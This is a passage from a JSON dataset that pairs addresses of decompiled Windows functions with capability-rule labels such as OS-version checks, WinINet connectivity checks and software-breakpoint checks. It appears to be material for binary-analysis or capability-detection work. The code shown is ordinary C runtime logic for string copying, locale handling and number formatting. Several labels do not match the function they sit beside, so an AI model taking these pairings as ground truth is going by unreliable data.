    },
    "0046667c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0046667c(int16_t *arg_8h, int32_t arg_ch, int16_t *arg_10h, int32_t arg_14h)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    int16_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uStack24;\n    int32_t var_4h;\n    \n    if (arg_14h == 0) {\n        if (arg_8h != NULL) goto code_r0x004665ce;\n        if (arg_ch != 0) goto code_r0x004665b4;\n        goto code_r0x00466675;\n    }\n    if (arg_8h != NULL) {\ncode_r0x004665ce:\n        if (arg_ch != 0) {\n            if ((arg_14h == 0) || (arg_10h != NULL)) {\n                var_4h = arg_14h;\n                piVar3 = arg_8h;\n                iVar5 = arg_ch;\n                do {\n                    if (*piVar3 == 0) {\n                        if (arg_14h != -1) {\n                            if (arg_14h == 0) goto code_r0x00466642;\n                            goto code_r0x00466621;\n                        }\n                        iVar4 = arg_10h - piVar3;\n                        goto code_r0x00466607;\n                    }\n                    piVar3 = piVar3 + 1;\n                    iVar5 = iVar5 + -1;\n                } while (iVar5 != 0);\n            }\n            *arg_8h = 0;\n        }\n    }\ncode_r0x004665b4:\n    puVar2 = fcn.0043bcb5();\n    uStack24 = 0x16;\n    goto code_r0x004665bb;\n    while (iVar5 = iVar5 + -1,  iVar5 != 0) {\ncode_r0x00466607:\n        iVar1 = *(iVar4 + piVar3);\n        *piVar3 = iVar1;\n        piVar3 = piVar3 + 1;\n        if (iVar1 == 0) break;\n    }\n    goto code_r0x00466649;\n    while ((iVar5 = iVar5 + -1,  iVar5 != 0 && (var_4h = var_4h + -1,  var_4h != 0))) {\ncode_r0x00466621:\n        iVar1 = *arg_10h;\n        arg_10h = arg_10h + 1;\n        *piVar3 = iVar1;\n        piVar3 = piVar3 + 1;\n        if (iVar1 == 0) goto code_r0x00466675;\n    }\ncode_r0x00466642:\n    if (var_4h == 0) {\n        *piVar3 = 0;\n    }\ncode_r0x00466649:\n    if (iVar5 == 0) {\n        if (arg_14h == -1) {\n            arg_8h[arg_ch + -1] = 0;\n            uStack24 = 0x50;\n        }\n        else {\n            *arg_8h = 0;\n            puVar2 = fcn.0043bcb5();\n            uStack24 = 0x22;\ncode_r0x004665bb:\n            *puVar2 = uStack24;\n            fcn.0043bb3e();\n        }\n    }\n    else {\ncode_r0x00466675:\n        uStack24 = 0;\n    }\n    return uStack24;\n}\n",
        "token_count": 796
    },
    "0046718b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0046718b(uint16_t *arg_8h, int32_t arg_ch)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint16_t *puVar4;\n    uint16_t *puVar5;\n    uint32_t uVar6;\n    bool bVar7;\n    uint arg_ch_00;\n    int32_t var_4h;\n    \n    if ((arg_8h != NULL) && (uVar6 = 0,  *arg_8h != 0)) {\n        puVar5 = 0x480c28;\n        puVar4 = arg_8h;\n        do {\n            uVar1 = *puVar4;\n            bVar7 = uVar1 < *puVar5;\n            if (uVar1 != *puVar5) {\ncode_r0x004671d6:\n                uVar2 = -bVar7 | 1;\n                goto code_r0x004671db;\n            }\n            if (uVar1 == 0) break;\n            uVar1 = puVar4[1];\n            bVar7 = uVar1 < puVar5[1];\n            if (uVar1 != puVar5[1]) goto code_r0x004671d6;\n            puVar4 = puVar4 + 2;\n            puVar5 = puVar5 + 2;\n        } while (uVar1 != 0);\n        uVar2 = 0;\ncode_r0x004671db:\n        if (uVar2 != 0) {\n            iVar3 = fcn.0047007e(arg_8h, L\"utf8\");\n            if (iVar3 == 0) {\n                return 0xfde9;\n            }\n            iVar3 = fcn.0047007e(arg_8h, L\"utf-8\");\n            if (iVar3 == 0) {\n                return 0xfde9;\n            }\n            puVar5 = 0x480c3c;\n            puVar4 = arg_8h;\n            do {\n                uVar1 = *puVar4;\n                bVar7 = uVar1 < *puVar5;\n                if (uVar1 != *puVar5) {\ncode_r0x0046722c:\n                    uVar6 = -bVar7 | 1;\n                    break;\n                }\n                if (uVar1 == 0) break;\n                uVar1 = puVar4[1];\n                bVar7 = uVar1 < puVar5[1];\n                if (uVar1 != puVar5[1]) goto code_r0x0046722c;\n                puVar4 = puVar4 + 2;\n                puVar5 = puVar5 + 2;\n            } while (uVar1 != 0);\n            if (uVar6 != 0) {\n                iVar3 = fcn.0045c3ff(arg_8h);\n                return iVar3;\n            }\n            arg_ch_00 = 0x2000000b;\n            goto code_r0x00467267;\n        }\n    }\n    arg_ch_00 = 0x20001004;\ncode_r0x00467267:\n    iVar3 = fcn.0046054c(arg_ch + 0x250, arg_ch_00, &var_4h, 2);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    if (var_4h < 3) {\n        return 0xfde9;\n    }\n    return var_4h;\n}\n",
        "token_count": 783
    },
    "00467c3b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00467c3b(uint32_t Locale, int32_t arg_ch)\n\n{\n    int16_t *piVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int16_t *piVar5;\n    bool bVar6;\n    uint32_t lpLCData;\n    \n    iVar3 = fcn.0045ce63();\n    iVar4 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoW)(Locale & 0x3ff | 0x400, 0x20000001, &lpLCData, 2);\n    if (iVar4 == 0) {\n        bVar6 = false;\n    }\n    else if ((Locale == lpLCData) || (arg_ch == 0)) {\n        bVar6 = true;\n    }\n    else {\n        piVar5 = *(iVar3 + 0x50);\n        piVar1 = piVar5 + 1;\n        do {\n            iVar2 = *piVar5;\n            piVar5 = piVar5 + 1;\n        } while (iVar2 != 0);\n        iVar3 = fcn.0046778d(*(iVar3 + 0x50));\n        bVar6 = iVar3 != piVar5 - piVar1 >> 1;\n    }\n    return bVar6;\n}\n",
        "token_count": 293
    },
    "00467d11": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid __cdecl fcn.00467d11(int16_t *arg_8h, uint32_t *arg_ch, int32_t arg_10h)\n\n{\n    int16_t **arg_10h_00;\n    int16_t *piVar1;\n    char cVar2;\n    int32_t iVar3;\n    int16_t **arg_10h_01;\n    int32_t iVar4;\n    uint32_t arg_8h_00;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint Locale;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    iVar3 = fcn.0045ce63();\n    arg_10h_01 = iVar3 + 0x50;\n    var_10h = 0;\n    Locale = 0;\n    var_8h = 0;\n    iVar4 = fcn.0045ce63();\n    *(iVar4 + 0x34c) = &var_10h;\n    piVar1 = arg_8h + 0x40;\n    *arg_10h_01 = arg_8h;\n    arg_10h_00 = iVar3 + 0x54;\n    *arg_10h_00 = piVar1;\n    if ((piVar1 != NULL) && (*piVar1 != 0)) {\n        fcn.00467cb0(0x480198, *0x4802ac + -1, arg_10h_00);\n    }\n    var_10h = 0;\n    if ((*arg_10h_01 == NULL) || (**arg_10h_01 == 0)) {\n        if ((*arg_10h_00 == NULL) || (**arg_10h_00 == 0)) {\n            var_10h = 0x104;\n            Locale = (*_sym.imp.KERNEL32.dll_GetUserDefaultLCID)();\n            var_8h = Locale;\n        }\n        else {\n            fcn.0046762a(&var_10h);\n        }\n    }\n    else {\n        if ((*arg_10h_00 == NULL) || (**arg_10h_00 == 0)) {\n            fcn.0046772e(&var_10h);\n        }\n        else {\n            fcn.00467693(&var_10h);\n        }\n        if ((var_10h == 0) && (cVar2 = fcn.00467cb0(0x47fe88, *0x480194 + -1, arg_10h_01),  cVar2 != '\\0')) {\n            if ((*arg_10h_00 == NULL) || (**arg_10h_00 == 0)) {\n                fcn.0046772e(&var_10h);\n            }\n            else {\n                fcn.00467693(&var_10h);\n            }\n        }\n    }\n    if ((((var_10h != 0) && (arg_8h_00 = fcn.00467b35(-(arg_8h != NULL) & arg_8h + 0x80, &var_10h),  arg_8h_00 != 0)) &&\n        (iVar4 = (*_sym.imp.KERNEL32.dll_IsValidCodePage)(arg_8h_00 & 0xffff),  iVar4 != 0)) &&\n       (iVar4 = (*_sym.imp.KERNEL32.dll_IsValidLocale)(Locale, 1),  iVar4 != 0)) {\n        if (arg_ch != NULL) {\n            *arg_ch = arg_8h_00;\n        }\n        fcn.00460750(Locale, iVar3 + 0x2a0, 0x55, 0);\n        if (arg_10h != 0) {\n            fcn.00460750(Locale, arg_10h + 0x120, 0x55, 0);\n            iVar3 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoW)(Locale, 0x1001, arg_10h, 0x40);\n            if ((iVar3 != 0) &&\n               (iVar3 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoW)(var_8h, 0x1002, arg_10h + 0x80, 0x40),  iVar3 != 0)) {\n                fcn.0046fdd8(arg_8h_00, arg_10h + 0x100, 0x10, 10);\n            }\n        }\n    }\n    fcn.004303e9(arg_ch);\n    return;\n}\n",
        "token_count": 1042
    },
    "00468e95": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00468e95(char *arg_8h, int32_t arg_ch)\n\n{\n    if (arg_ch == 0) {\n        return true;\n    }\n    for (; *arg_8h == '0'; arg_8h = arg_8h + 1) {\n    }\n    return *arg_8h != '\\0';\n}\n",
        "token_count": 81
    },
    "00469040": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_954h\n\nvoid __cdecl\nfcn.00469040(uint32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h, int32_t arg_14h, uint32_t *arg_18h, char *arg_1ch, \n            int32_t arg_20h)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    uint32_t *puVar8;\n    int32_t iVar9;\n    uint32_t *puVar10;\n    uint32_t *puVar11;\n    uint32_t uVar12;\n    uint32_t *puVar13;\n    char *pcVar14;\n    uint32_t *puVar15;\n    bool bVar16;\n    uint var_954h;\n    uint var_950h;\n    uint32_t *var_784h;\n    uint32_t var_77ch;\n    char *var_778h;\n    uint32_t *var_774h;\n    uint32_t *var_770h;\n    uint32_t var_76ch;\n    uchar var_765h;\n    uint32_t *var_764h;\n    uint32_t *var_760h;\n    uint32_t *var_75ch;\n    uint32_t *var_758h;\n    uint32_t *var_754h;\n    uint32_t var_750h;\n    uint32_t *var_74ch;\n    char *var_748h;\n    uint32_t *var_744h;\n    uint var_740h;\n    uint32_t *var_574h;\n    uint32_t var_570h;\n    uint var_56ch;\n    uint32_t *var_3a4h;\n    uint32_t var_3a0h;\n    uint32_t auStack928 [114];\n    uint32_t *var_1d4h;\n    uint32_t var_1d0h;\n    uint32_t var_1cch;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    var_77ch = 0;\n    var_778h = arg_1ch;\n    var_784h = arg_18h;\n    uVar3 = arg_ch >> 0x14 & 0x7ff;\n    bVar16 = uVar3 != 0;\n    if (bVar16) {\n        uVar3 = 0;\n        iVar9 = 0x100000;\n    }\n    else {\n        iVar9 = 0;\n    }\n    var_1cch = (arg_ch & 0xfffff) + iVar9 + CARRY4(arg_8h, uVar3);\n    puVar15 = !bVar16 + (arg_ch >> 0x14 & 0x7ff);\n    var_75ch = puVar15;\n    fcn.004705c0();\n    fcn.004706d0();\n    var_76ch = fcn.00476f60();\n    if ((var_76ch == 0x7fffffff) || (var_76ch == 0x80000000)) {\n        var_76ch = 0;\n    }\n    var_1d0h = arg_8h + uVar3;\n    puVar10 = (var_1cch != 0) + 1;\n    var_1d4h = puVar10;\n    if (puVar15 < 0x433) {\n        if (puVar15 == 0x35) {\ncode_r0x004695e4:\n            var_77ch = 0;\n            uVar3 = (&var_1d0h)[var_1cch != 0];\n            iVar9 = 0x1f;\n            if (uVar3 != 0) {\n                for (; uVar3 >> iVar9 == 0; iVar9 = iVar9 + -1) {\n                }\n            }\n            if (uVar3 == 0) {\n                iVar9 = 0;\n            }\n            else {\n                iVar9 = iVar9 + 1;\n            }\n            puVar13 = (iVar9 == 0x20) + puVar10;\n            if (puVar13 < 0x74) {\n                if (puVar13 + -1 != 0xffffffff) {\n                    var_74ch = puVar13 + -2;\n                    puVar11 = puVar13 + -1;\n                    do {\n                        if (puVar11 < puVar10) {\n                            var_750h = (&var_1d0h)[puVar11];\n                        }\n                        else {\n                            var_750h = 0;\n                        }\n                        if (var_74ch < puVar10) {\n                            uVar3 = (&var_1d4h)[puVar11];\n                        }\n                        else {\n                            uVar3 = 0;\n                        }\n                        puVar8 = puVar11 + -1;\n                        (&var_1d0h)[puVar11] = uVar3 >> 0x1f | var_750h * 2;\n                        var_74ch = var_74ch + -1;\n                        puVar11 = puVar8;\n                        puVar10 = var_1d4h;\n                        puVar15 = var_75ch;\n                    } while (puVar8 != 0xffffffff);\n                }\n            }\n            else {\n                var_574h = NULL;\n                var_1d4h = NULL;\n                fcn.0046cb87(&var_1d0h, 0x1cc, &var_570h, 0);\n                puVar13 = var_1d4h;\n            }\n            var_1d4h = puVar13;\n            uVar3 = 0x434U - puVar15 >> 5;\n            fcn.00431db0(&var_570h);\n            (&var_570h)[uVar3] = 1 << (0x434U - puVar15 & 0x1f);\n        }\n        else {\n            var_570h = 0;\n            var_56ch = 0x100000;\n            var_574h = 0x2;\n            if (var_1cch == 0) goto code_r0x004695e4;\n            iVar9 = 0;\n            do {\n                if (*(&var_570h + iVar9) != *(&var_1d0h + iVar9)) goto code_r0x004695e4;\n                iVar9 = iVar9 + 4;\n            } while (iVar9 != 8);\n            var_77ch = 0;\n            iVar9 = 0x1f;\n            if (var_1cch != 0) {\n                for (; var_1cch >> iVar9 == 0; iVar9 = iVar9 + -1) {\n                }\n            }\n            if (var_1cch == 0) {\n                iVar9 = 0;\n            }\n            else {\n                iVar9 = iVar9 + 1;\n            }\n            puVar13 = (0x20U - iVar9 < 2) + puVar10;\n            if (puVar13 < 0x74) {\n                if (puVar13 + -1 != 0xffffffff) {\n                    var_74ch = puVar13 + -2;\n                    puVar11 = puVar13 + -1;\n                    do {\n                        if (puVar11 < puVar10) {\n                            var_750h = (&var_1d0h)[puVar11];\n                        }\n                        else {\n                            var_750h = 0;\n                        }\n                        if (var_74ch < puVar10) {\n                            uVar3 = (&var_1d4h)[puVar11];\n                        }\n                        else {\n                            uVar3 = 0;\n                        }\n                        puVar8 = puVar11 + -1;\n                        (&var_1d0h)[puVar11] = uVar3 >> 0x1e | var_750h << 2;\n                        var_74ch = var_74ch + -1;\n                        puVar11 = puVar8;\n                        puVar10 = var_1d4h;\n                        puVar15 = var_75ch;\n                    } while (puVar8 != 0xffffffff);\n                }\n            }\n            else {\n                var_574h = NULL;\n                var_1d4h = NULL;\n                fcn.0046cb87(&var_1d0h, 0x1cc, &var_570h, 0);\n                puVar13 = var_1d4h;\n            }\n            var_1d4h = puVar13;\n            uVar3 = 0x435U - puVar15 >> 5;\n            fcn.00431db0(&var_570h);\n            (&var_570h)[uVar3] = 1 << (0x435U - puVar15 & 0x1f);\n        }\n        var_574h = uVar3 + 1;\n        var_3a4h = var_574h;\n        fcn.0046cb87(&var_3a0h, 0x1cc, &var_570h, var_574h * 4);\n    }\n    else {\n        var_570h = 0;\n        var_56ch = 0x100000;\n        var_574h = 0x2;\n        if (var_1cch == 0) {\ncode_r0x00469302:\n            var_750h = puVar15 - 0x432U & 0x1f;\n            var_754h = 0x20 - var_750h;\n            puVar15 = puVar15 - 0x432U >> 5;\n            var_770h = puVar15;\n            iVar9 = fcn.00476ee0();\n            uVar3 = (&var_1d4h)[puVar10];\n            var_764h = iVar9 + -1;\n            iVar9 = 0x1f;\n            if (uVar3 != 0) {\n                for (; uVar3 >> iVar9 == 0; iVar9 = iVar9 + -1) {\n                }\n            }\n            var_760h = ~var_764h;\n            var_77ch = 0;\n            if (uVar3 == 0) {\n                iVar9 = 0;\n            }\n            else {\n                iVar9 = iVar9 + 1;\n            }\n            if ((puVar10 + puVar15 < 0x74) &&\n               (var_75ch = (0x20U - iVar9 < var_750h) + puVar10 + puVar15,  var_75ch < 0x74)) {\n                var_774h = puVar15 + -1;\n                var_74ch = var_75ch + -1;\n                uVar3 = var_750h;\n                if (var_74ch != var_774h) {\n                    puVar11 = var_74ch - puVar15;\n                    puVar13 = &var_1d4h + puVar11;\n                    do {\n                        if (puVar11 < puVar10) {\n                            uVar3 = puVar13[1];\n                        }\n                        else {\n                            uVar3 = 0;\n                        }\n                        if (puVar11 + -1 < puVar10) {\n                            uVar12 = *puVar13;\n                        }\n                        else {\n                            uVar12 = 0;\n                        }\n                        puVar13 = puVar13 + -1;\n                        (&var_1d0h)[var_74ch] =\n                             (uVar12 & var_760h) >> (var_754h & 0x1f) | (uVar3 & var_764h) << (var_750h & 0x1f);\n                        var_74ch = var_74ch + -1;\n                        puVar11 = puVar11 + -1;\n                        puVar10 = var_1d4h;\n                        puVar15 = var_770h;\n                    } while (var_74ch != var_774h);\n                }\n                var_750h = uVar3;\n                var_1d4h = var_75ch;\n                if (puVar15 != NULL) {\n                    puVar6 = &var_1d0h;\n                    for (; puVar15 != NULL; puVar15 = puVar15 + -1) {\n                        *puVar6 = 0;\n                        puVar6 = puVar6 + 1;\n                    }\n                }\n            }\n            else {\n                var_1d4h = NULL;\n                var_574h = NULL;\n                fcn.0046cb87(&var_1d0h, 0x1cc, &var_570h, 0);\n            }\n            var_570h = 2;\n        }\n        else {\n            iVar9 = 0;\n            do {\n                if (*(&var_570h + iVar9) != *(&var_1d0h + iVar9)) goto code_r0x00469302;\n                iVar9 = iVar9 + 4;\n            } while (iVar9 != 8);\n            var_750h = puVar15 - 0x431U & 0x1f;\n            var_764h = 0x20 - var_750h;\n            puVar15 = puVar15 - 0x431U >> 5;\n            var_758h = puVar15;\n            iVar9 = fcn.00476ee0();\n            uVar3 = (&var_1d4h)[puVar10];\n            var_760h = iVar9 + -1;\n            iVar9 = 0x1f;\n            if (uVar3 != 0) {\n                for (; uVar3 >> iVar9 == 0; iVar9 = iVar9 + -1) {\n                }\n            }\n            var_754h = ~var_760h;\n            var_77ch = 0;\n            if (uVar3 == 0) {\n                iVar9 = 0;\n            }\n            else {\n                iVar9 = iVar9 + 1;\n            }\n            if ((puVar10 + puVar15 < 0x74) &&\n               (var_770h = (0x20U - iVar9 < var_750h) + puVar10 + puVar15,  var_770h < 0x74)) {\n                var_774h = puVar15 + -1;\n                var_74ch = var_770h + -1;\n                if (var_74ch != var_774h) {\n                    puVar13 = var_74ch - puVar15;\n                    var_75ch = &var_1d4h + puVar13;\n                    do {\n                        if (puVar13 < puVar10) {\n                            uVar3 = var_75ch[1];\n                        }\n                        else {\n                            uVar3 = 0;\n                        }\n                        if (puVar13 + -1 < puVar10) {\n                            uVar12 = *var_75ch;\n                        }\n                        else {\n                            uVar12 = 0;\n                        }\n                        var_75ch = var_75ch + -1;\n                        (&var_1d0h)[var_74ch] =\n                             (uVar3 & var_760h) << (var_750h & 0x1f) | (uVar12 & var_754h) >> (var_764h & 0x1f);\n                        var_74ch = var_74ch + -1;\n                        puVar13 = puVar13 + -1;\n                        puVar10 = var_1d4h;\n                        puVar15 = var_758h;\n                    } while (var_74ch != var_774h);\n                }\n                var_1d4h = var_770h;\n                if (puVar15 != NULL) {\n                    puVar6 = &var_1d0h;\n                    for (; puVar15 != NULL; puVar15 = puVar15 + -1) {\n                        *puVar6 = 0;\n                        puVar6 = puVar6 + 1;\n                    }\n                }\n            }\n            else {\n                var_1d4h = NULL;\n                var_574h = NULL;\n                fcn.0046cb87(&var_1d0h, 0x1cc, &var_570h, 0);\n            }\n            var_570h = 4;\n        }\n        var_3a4h = 0x1;\n        var_56ch = 0;\n        var_574h = 0x1;\n        fcn.0046cb87(&var_3a0h, 0x1cc, &var_570h, 4);\n    }\n    var_750h = 10;\n    if (var_76ch < 0) {\n        var_77ch = -var_76ch;\n        for (var_760h = var_77ch / 10; var_760h != NULL; var_760h = var_760h - var_74ch) {\n            var_74ch = var_760h;\n            if (0x26 < var_760h) {\n                var_74ch = 0x26;\n            }\n            uVar3 = *(var_74ch * 4 + 0x481566);\n            uVar12 = *(var_74ch * 4 + 0x481567);\n            var_574h = uVar3 + uVar12;\n            fcn.00431db0(&var_570h);\n            fcn.004312b0(&var_570h + uVar3, *(var_74ch * 4 + 0x481564) * 4 + 0x480c60, uVar12 << 2);\n            uVar3 = var_1d0h;\n            var_764h = var_574h;\n            if (var_574h < 0x2) {\n                if (var_570h == 0) {\ncode_r0x00469c5e:\n                    var_954h = 0;\n                    var_1d4h = NULL;\n                    iVar9 = 0;\n                    puVar6 = &var_950h;\n                    goto code_r0x00469f0f;\n                }\n                if ((var_570h == 1) || (var_1d4h == NULL)) goto code_r0x00469f20;\n                uVar12 = 0;\n                puVar15 = NULL;\n                do {\n                    uVar3 = (&var_1d0h)[puVar15];\n                    uVar7 = var_570h * uVar3;\n                    (&var_1d0h)[puVar15] = uVar7 + uVar12;\n                    uVar12 = (var_570h * uVar3 >> 0x20) + CARRY4(uVar7, uVar12);\n                    puVar15 = puVar15 + 1;\n                } while (puVar15 != var_1d4h);\ncode_r0x00469cbe:\n                var_754h = var_1d4h;\n                if (uVar12 == 0) goto code_r0x00469f20;\n                if (var_1d4h < 0x73) {\n                    (&var_1d0h)[var_1d4h] = uVar12;\n                    var_1d4h = var_1d4h + 1;\n                    goto code_r0x00469f20;\n                }\ncode_r0x00469fc5:\n                var_954h = 0;\n                var_1d4h = NULL;\n                fcn.0046cb87(&var_1d0h, 0x1cc, &var_950h, 0);\n                bVar16 = false;\n            }\n            else {\n                if (var_1d4h < 0x2) {\n                    var_1d4h = var_574h;\n                    fcn.0046cb87(&var_1d0h, 0x1cc, &var_570h, var_574h << 2);\n                    if (uVar3 != 0) {\n                        if ((uVar3 != 1) && (var_1d4h != NULL)) {\n                            uVar12 = 0;\n                            puVar15 = NULL;\n                            do {\n                                uVar7 = (&var_1d0h)[puVar15];\n                                uVar4 = uVar3 * uVar7;\n                                (&var_1d0h)[puVar15] = uVar4 + uVar12;\n                                uVar12 = (uVar3 * uVar7 >> 0x20) + CARRY4(uVar4, uVar12);\n                                puVar15 = puVar15 + 1;\n                            } while (puVar15 != var_1d4h);\n                            goto code_r0x00469cbe;\n                        }\n                        goto code_r0x00469f20;\n                    }\n                    goto code_r0x00469c5e;\n                }\n                var_770h = &var_570h;\n                if (var_574h < var_1d4h) {\n                    var_754h = &var_1d0h;\n                    var_774h = var_574h;\n                }\n                else {\n                    var_770h = &var_1d0h;\n                    var_754h = &var_570h;\n                    var_774h = var_1d4h;\n                    var_1d4h = var_574h;\n                }\n                puVar10 = NULL;\n                puVar15 = NULL;\n                var_744h = NULL;\n                var_764h = var_1d4h;\n                if (var_774h != NULL) {\n                    do {\n                        if (var_770h[puVar10] == 0) {\n                            if (puVar10 == puVar15) {\n                                (&var_740h)[puVar10] = 0;\n                                puVar15 = puVar10 + 1;\n                                var_744h = puVar15;\n                            }\n                        }\n                        else {\n                            var_748h = NULL;\n                            var_758h = NULL;\n                            puVar13 = puVar10;\n                            if (var_1d4h != NULL) {\n                                do {\n                                    if (puVar13 == 0x73) break;\n                                    if (puVar13 == puVar15) {\n                                        (&var_740h)[puVar13] = 0;\n                                        var_744h = var_758h + 1 + puVar10;\n                                    }\n                                    uVar3 = var_754h[var_758h];\n                                    uVar12 = var_770h[puVar10];\n                                    uVar4 = uVar3 * uVar12;\n                                    uVar5 = uVar4 + var_748h;\n                                    puVar15 = &var_740h + puVar13;\n                                    uVar7 = *puVar15;\n                                    *puVar15 = *puVar15 + uVar5;\n                                    var_748h = (uVar3 * uVar12 >> 0x20) + CARRY4(uVar4, var_748h) + CARRY4(uVar7, uVar5)\n                                    ;\n                                    var_758h = var_758h + 1;\n                                    puVar13 = puVar13 + 1;\n                                    puVar15 = var_744h;\n                                } while (var_758h != var_1d4h);\n                                if (var_748h != NULL) {\n                                    puVar11 = puVar13;\n                                    var_75ch = &var_740h + puVar13;\n                                    do {\n                                        if (puVar11 == 0x73) goto code_r0x00469fc5;\n                                        puVar13 = puVar11 + 1;\n                                        if (puVar11 == puVar15) {\n                                            *var_75ch = 0;\n                                            var_744h = puVar13;\n                                        }\n                                        puVar8 = var_75ch + 1;\n                                        uVar3 = *var_75ch;\n                                        *var_75ch = *var_75ch + var_748h;\n                                        var_748h = CARRY4(uVar3, var_748h);\n                                        puVar15 = var_744h;\n                                        puVar11 = puVar13;\n                                        var_75ch = puVar8;\n                                    } while (var_748h != NULL);\n                                }\n                            }\n                            if (puVar13 == 0x73) goto code_r0x00469fc5;\n                        }\n                        puVar10 = puVar10 + 1;\n                    } while (puVar10 != var_774h);\n                }\n                iVar9 = puVar15 << 2;\n                puVar6 = &var_740h;\n                var_1d4h = puVar15;\ncode_r0x00469f0f:\n                fcn.0046cb87(&var_1d0h, 0x1cc, puVar6, iVar9);\ncode_r0x00469f20:\n                bVar16 = true;\n            }\n            if (!bVar16) goto code_r0x0046a013;\n        }\n        if (var_77ch % 10 != 0) {\n            var_77ch = *((var_77ch % 10) * 4 + 0x4815fc);\n            if (var_77ch == 0) {\ncode_r0x0046a013:\n                var_1d4h = NULL;\n                puVar6 = &var_1d0h;\n                goto code_r0x0046a020;\n            }\n            if ((var_77ch != 1) && (var_1d4h != NULL)) {\n                uVar3 = 0;\n                puVar15 = NULL;\n                do {\n                    uVar12 = (&var_1d0h)[puVar15];\n                    uVar7 = var_77ch * uVar12;\n                    (&var_1d0h)[puVar15] = uVar7 + uVar3;\n                    uVar3 = (var_77ch * uVar12 >> 0x20) + CARRY4(uVar7, uVar3);\n                    puVar15 = puVar15 + 1;\n                } while (puVar15 != var_1d4h);\n                if (uVar3 != 0) {\n                    if (0x72 < var_1d4h) goto code_r0x0046a013;\n                    (&var_1d0h)[var_1d4h] = uVar3;\n                    var_1d4h = var_1d4h + 1;\n                }\n            }\n        }\n    }\n    else {\n        for (var_754h = var_76ch / 10; var_754h != NULL; var_754h = var_754h - var_75ch) {\n            var_75ch = var_754h;\n            if (0x26 < var_754h) {\n                var_75ch = 0x26;\n            }\n            uVar3 = *(var_75ch * 4 + 0x481566);\n            uVar12 = *(var_75ch * 4 + 0x481567);\n            var_574h = uVar3 + uVar12;\n            fcn.00431db0(&var_570h);\n            fcn.004312b0(&var_570h + uVar3, *(var_75ch * 4 + 0x481564) * 4 + 0x480c60, uVar12 << 2);\n            uVar3 = var_3a0h;\n            var_774h = var_574h;\n            if (var_574h < 0x2) {\n                if (var_570h == 0) {\n                    iVar9 = 0;\n                    var_744h = NULL;\n                    var_3a4h = NULL;\ncode_r0x00469aa2:\n                    puVar6 = &var_740h;\n                    goto code_r0x00469aa9;\n                }\n                if ((var_570h == 1) || (var_3a4h == NULL)) goto code_r0x00469aba;\n                uVar12 = 0;\n                puVar15 = NULL;\n                do {\n                    uVar3 = auStack928[puVar15 + -1];\n                    uVar7 = var_570h * uVar3;\n                    auStack928[puVar15 + -1] = uVar7 + uVar12;\n                    uVar12 = (var_570h * uVar3 >> 0x20) + CARRY4(uVar7, uVar12);\n                    puVar15 = puVar15 + 1;\n                } while (puVar15 != var_3a4h);\ncode_r0x004698d5:\n                var_760h = var_3a4h;\n                if (uVar12 == 0) goto code_r0x00469aba;\n                if (var_3a4h < 0x73) {\n                    auStack928[var_3a4h + -1] = uVar12;\n                    var_3a4h = var_3a4h + 1;\n                    goto code_r0x00469aba;\n                }\n                var_574h = NULL;\n                puVar6 = &var_570h;\ncode_r0x00469b24:\n                var_3a4h = NULL;\n                fcn.0046cb87(&var_3a0h, 0x1cc, puVar6, 0);\n                bVar16 = false;\n            }\n            else {\n                if (0x1 < var_3a4h) {\n                    var_770h = &var_570h;\n                    if (var_574h < var_3a4h) {\n                        var_74ch = &var_3a0h;\n                        var_764h = var_574h;\n                    }\n                    else {\n                        var_770h = &var_3a0h;\n                        var_74ch = &var_570h;\n                        var_764h = var_3a4h;\n                        var_3a4h = var_574h;\n                    }\n                    puVar10 = NULL;\n                    puVar15 = NULL;\n                    var_744h = NULL;\n                    var_774h = var_3a4h;\n                    if (var_764h != NULL) {\n                        do {\n                            if (var_770h[puVar10] == 0) {\n                                if (puVar10 == puVar15) {\n                                    (&var_740h)[puVar10] = 0;\n                                    puVar15 = puVar10 + 1;\n                                    var_744h = puVar15;\n                                }\n                            